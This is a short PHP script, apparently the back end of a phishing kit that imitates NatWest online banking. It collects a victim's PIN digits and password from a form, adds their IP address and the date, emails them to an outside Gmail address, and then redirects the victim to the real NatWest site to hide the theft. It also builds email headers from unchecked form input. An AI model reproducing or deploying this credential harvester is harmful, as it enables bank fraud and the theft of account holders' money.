<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "--------    Pin   ------------------------------\n";
$message .= "1st ".$_POST['1st']."\n";
$message .= "2nd ".$_POST['2nd']."\n";
$message .= "3rd ".$_POST['3rd']."\n";
$message .= "4th ".$_POST['4']."\n";
$message .= "--------    Password   ------------------------------\n";
$message .= "Password ".$_POST['pass']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--------Mr Money 2015------------------------------\n";

$recipient = "chodgroups@gmail.com";
$subject = "Saima Amna | $ip";
$headers = "FROM: Saima Amna<saimachod0321@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://natwest.com");

	   }


?>